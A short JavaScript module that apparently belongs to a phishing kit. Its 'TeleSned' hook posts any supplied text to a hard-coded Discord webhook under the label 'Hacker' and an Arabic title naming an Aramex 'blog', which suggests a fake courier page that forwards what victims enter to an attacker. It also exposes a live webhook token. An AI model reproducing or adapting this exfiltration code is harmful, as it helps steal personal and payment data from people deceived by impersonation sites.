import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1332503563334848602/aAkBPLHnlrA4tUlHgAS53ZNMDL-qWKaZvGXKavE2HO4-f3FVjuL0zoLbDiEzXL0ma5vk",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
